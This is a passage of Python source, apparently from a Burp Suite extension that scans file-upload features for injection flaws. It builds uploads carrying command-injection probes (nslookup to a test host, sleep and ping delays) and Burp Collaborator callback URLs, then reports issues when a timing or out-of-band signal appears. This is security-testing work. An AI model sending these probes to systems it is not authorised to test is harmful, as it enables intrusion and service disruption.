            # yield "msiexec", "msiexec /a", Constants.MARKER_COLLAB_URL, None
        else:
            yield "Nslookup", "nslookup", "test.example.org", "test.example.org"

    def _get_sleep_commands(self, injector):
        if injector.opts.sleep_time > 0:
            # payloads being sent?
            # Format: name, command, factor, args
            # Unix
            yield "Sleep", "sleep", 1, ""
            # Windows
            yield "Ping", "ping -n", 2, " localhost"

    def _send_get_request(self, brr, relative_url, create_log):
        # Simply tries to send brr but as a GET request and to a different URL
        service = brr.getHttpService()
        iRequestInfo = self._helpers.analyzeRequest(brr)
        new_req = "GET " + relative_url + " HTTP/1.1" + Constants.NEWLINE
        headers = iRequestInfo.getHeaders()
        # very strange, Burp seems to include the status line in .getHeaders()...
        headers = headers[1:]
        new_headers = []
        for header in headers:
            is_bad_header = False
            for bad_header in Constants.REDL_URL_BAD_HEADERS:
                if header.lower().startswith(bad_header):
                    is_bad_header = True
                    break
            if is_bad_header:
                continue
            new_headers.append(header)
        new_headers.append("Accept: */*")

        new_headers = Constants.NEWLINE.join(new_headers)
        new_req += new_headers
        new_req += Constants.NEWLINE * 2

        new_req = new_req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
        attack = self._callbacks.makeHttpRequest(service, new_req)
        resp = attack.getResponse()
        if resp and create_log:
            # create a new log entry with the message details
            self.add_log_entry(attack)

    def _send_collaborator(self, injector, burp_colab, all_types, basename, content, issue, redownload=False,
                           replace=None, randomize=True):
        colab_tests = []
        types = injector.get_types(all_types)
        i = 0
        for prefix, ext, mime_type in types:
            break_when_done = False
            for prot in Constants.PROTOCOLS_HTTP:
                colab_url = burp_colab.generate_payload(True)
                if callable(replace):
                    # we got a function like object we need to call with the content and collaborator URL
                    # to get the collaborator injected content
                    new_content = replace(content, prot + colab_url + "/")
                    new_basename = basename
                elif type(replace) is list or type(replace) is tuple:
                    # we got a list of string that has to be replaced with the collaborator URL
                    new_content = content
                    new_basename = basename
                    already_found = []
                    for repl in replace:
                        if not repl:
                            if Constants.MARKER_COLLAB_URL not in content and \
                            Constants.MARKER_COLLAB_URL not in new_basename and \
                            Constants.MARKER_COLLAB_URL not in already_found:
                                print("Warning: Magic marker {} (looped) not found in content or filename of " \
                                      "_send_collaborator:\n {} {}".format(Constants.MARKER_COLLAB_URL, repr(content), repr(basename)))
                            already_found.append(Constants.MARKER_COLLAB_URL)
                            new_content = new_content.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                            new_basename = new_basename.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                        else:
                            if repl not in content and repl not in new_basename and repl not in already_found:
                                print("Warning: Marker", repl, "not found in content or filename of _send_collaborator:\n", repr(content), repr(basename))
                            already_found.append(repl)
                            new_content = new_content.replace(repl, colab_url)
                            new_basename = new_basename.replace(repl, colab_url)
                    # We don't need the different prot here, so break the inner loop over the protocols once sent
                    break_when_done = True
                elif replace:
                    # we got a string that has to be replaced with the collaborator URL
                    # no protocol here!
                    if replace not in content and replace not in basename:
                        print("Warning: Magic marker (str)", replace, "not found in content or filename of _send_collaborator:\n", repr(content), repr(basename))
                    new_content = content.replace(replace, colab_url)
                    new_basename = basename.replace(replace, colab_url)
                    # We don't need the different prot here, so break the inner loop over the protocols once sent
                    break_when_done = True
                else:
                    # the default is we simply replace Constants.MARKER_COLLAB_URL with a collaborator URL
                    if Constants.MARKER_COLLAB_URL not in content and Constants.MARKER_COLLAB_URL not in basename:
                        print("Warning: Magic marker (default) {} not found in content or filename of " \
                              "_send_collaborator:\n {} {}".format(Constants.MARKER_COLLAB_URL, repr(content), repr(basename)))
                    new_content = content.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                    new_basename = basename.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                if randomize:
                    number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                else:
                    number = ""
                new_content = new_content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                filename = prefix + new_basename + number + ext
                req = injector.get_request(filename, new_content, content_type=mime_type)
                i += 1
                if req:
                    x = self._filename_to_expected(filename)
                    if redownload:
                        urr = self._make_http_request(injector, req, redownload_filename=x)
                    else:
                        urr = self._make_http_request(injector, req)
                    if urr:
                        colab_tests.append(ColabTest(colab_url, urr, issue))
                if break_when_done:
                    break
        return colab_tests

    def _send_sleep_based(self, injector, basename, content, types, sleep_time, issue, redownload=False, randomize=True):
        types = injector.get_types(types)
        timeout_detection_time = (float(sleep_time) / 2) + 0.5
        i = 0
        for prefix, ext, mime_type in types:
            if randomize:
                number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
            else:
                number = ""
            filename = prefix + basename + number + ext
            expected_filename = self._filename_to_expected(filename)
            new_content = content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
            req = injector.get_request(filename, new_content, content_type=mime_type)
            i += 1
            if req:
                start = time.time()
                if redownload:
                    resp = self._make_http_request(injector, req, throttle=False, redownload_filename=expected_filename)
                else:
                    resp = self._make_http_request(injector, req, throttle=False)
                if resp and time.time() - start > timeout_detection_time:
                    # found a timeout, let's confirm with a changed request so it doesn't get a cached response
                    print("TIMEOUT DETECTED! Now checking if really a timeout or just a random timeout. " \
                          "Request leading to first timeout was:")
                    print(repr(req))
                    if randomize:
                        number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                    else:
                        number = ""
                    filename = prefix + basename + number + ext
                    expected_filename = self._filename_to_expected(filename)
                    # A feature to prevent caching of responses to identical requests
                    new_content = content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                    req = injector.get_request(filename, new_content, content_type=mime_type)
                    i += 1
                    if req:
                        start = time.time()
                        if redownload:
                            resp = self._make_http_request(injector, req, throttle=False, redownload_filename=expected_filename)
                        else:
                            resp = self._make_http_request(injector, req, throttle=False)
                        if resp and time.time() - start > timeout_detection_time:
                            csi = issue.create_copy()
                            csi.httpMessagesPy.append(resp.upload_rr)
                            self._add_scan_issue(csi)
                            # Returning here is an option, but actually knowing all different kind of injections is nicer
                            # return
                        else:
                            print("Unfortunately, this seems to be a false positive... not reporting")

    def _create_issue_template(self, base_request_response, name, detail, confidence, severity):
        return CustomScanIssue(base_request_response, self._helpers, name, detail, confidence, severity)

    def _make_http_request(self, injector, req, report_timeouts=True, throttle=True, redownload_filename=None):
        if injector.opts.redl_enabled and injector.opts.scan_controler.requesting_stop:
            print("User is requesting stop...")
            raise StopScanException()

        #sys.stdout.write(".")
        #sys.stdout.flush()

        # A little feature, allowing to randomize requests where ${RANDOMIZE} is present
        # To make sure the length of the request doesn't change, replace
        # ${RANDOMIZE}
        # with a numeric value between
        # 100000000000
        # and
        # 999999999999
        # Btw: that's a 12 digit number, and the last dash delimited number of a UUID is also 12 digits...

        req = req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
        base_request_response = injector.get_brr()
        service = base_request_response.getHttpService()
        # print("_make_http_request", service)
        attack = self._callbacks.makeHttpRequest(service, req)
        resp = attack.getResponse()
        if resp:
            resp = FloydsHelpers.jb2ps(resp)
            upload_rr = CustomRequestResponse('', '', service, req, resp)
            urr = UploadRequestsResponses(upload_rr)
            if injector.opts.create_log:
                # create a new log entry with the message details
                self.add_log_entry(upload_rr)
            if redownload_filename and injector.opts.redl_enabled and injector.opts.redl_configured:
                preflight_rr, download_rr = injector.opts.redownloader_try_redownload(resp, redownload_filename)
                urr.preflight_rr = preflight_rr
                urr.download_rr = download_rr
                if injector.opts.create_log:
                    # create a new log entry with the message details
                    if urr.preflight_rr:
                        self.add_log_entry(urr.preflight_rr)
                    if urr.download_rr:
                        self.add_log_entry(urr.download_rr)
        else:
            urr = None
            if report_timeouts:
                print("Adding informative for request timeout")
                desc = "A timeout occured when uploading a file. This could mean that you did memory exhaustion or " \
                       "a DoS attack on some component of the website. Or it was just a regular timeout. Check manually."
                service = base_request_response.getHttpService()
                url = self._helpers.analyzeRequest(base_request_response).getUrl()
                brr = CustomRequestResponse("", "", base_request_response.getHttpService(), req, None)
                csi = CustomScanIssue(brr, "File upload connection timeout", desc, "Certain", "Information",
                                      service, url)
                self._add_scan_issue(csi)
        if throttle and injector.opts.throttle_time > 0.0:
            time.sleep(injector.opts.throttle_time)
        return urr

